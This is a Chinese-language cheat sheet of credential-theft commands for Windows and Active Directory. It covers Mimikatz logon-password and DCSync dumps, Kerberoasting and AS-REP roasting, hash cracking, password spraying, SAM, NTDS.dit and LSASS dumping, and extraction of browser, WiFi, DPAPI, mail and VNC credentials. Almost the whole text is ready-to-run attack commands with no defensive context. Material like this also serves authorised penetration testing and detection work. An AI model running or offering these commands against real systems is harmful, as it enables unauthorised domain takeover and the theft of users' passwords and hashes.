# 凭证窃取详细分类

## 1. Mimikatz

### 基础命令

```bash
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::dcsync /domain:domain.com /all
```

### 导出票据

```bash
kerberos::list
kerberos::ppt ticket.kirbi
```

### DCSync攻击

```bash
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /user:administrator
```

---

## 2. Kerberoasting

### Impacket

```bash
GetUserSPNs.py domain/user:pass -request
GetUserSPNs.py domain/user:pass -request -output file.txt
```

### Rubeus

```bash
Rubeus.exe kerberoast /outfile:hashes.txt
```

### 破解

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

---

## 3. AS-REP Roasting

### Impacket

```bash
GetNPUsers.py domain/ -usersfile users.txt -format hashcat
GetNPUsers.py domain/user:pass -request
```

### Rubeus

```bash
Rubeus.exe asreproast /outfile:hashes.txt
```

---

## 4. 密码喷洒

### CrackMapExec

```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123
crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt
```

### Hydra

```bash
hydra -L users.txt -p Password123 smb://target
```

---

## 5. SAM数据库导出

### 本地

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

### 远程

```bash
crackmapexec smb target -u user -p pass --sam
secretsdump.py domain/user:pass@target
```

---

## 6. NTDS.dit导出

### Impacket

```bash
secretsdump.py domain/user:pass@dc_ip
secretsdump.py -hashes :NTHASH domain/user@dc_ip
```

### DNTDSutil

```cmd
ntdsutil
activate instance ntds
ifm
create full D:\ntds
quit
```

---

## 7. LSASS导出

### Mimikatz

```bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Procdump

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

---

## 8. 浏览器凭证

### LaZagne

```bash
laZagne.exe browsers
laZagne.exe all
```

### BrowserDump

```bash
browserdump.exe
```

---

## 9. WiFi凭证

```cmd
netsh wlan show profiles
netsh wlan export profile folder=. key=clear
```

---

## 10. DPAPI凭证

### Mimikatz

```bash
dpapi::cred /in:credential
dpapi::cred /in:credential /unprotect
```

---

## 11. 其他凭证

### 邮箱凭证

```bash
# Outlook
GetOutlookCredentials

# Thunderbird
laZagne.exe thunderbird
```

### VNC密码

```bash
# 读取VNC配置
Reg query "HKCU\Software\ORL\WinVNC3\Password"
```

### 保存的密码

```bash
# Chrome
sqlite3 "Chrome Data/Default/Login Data"
# Firefox
key4.db + logins.json
```
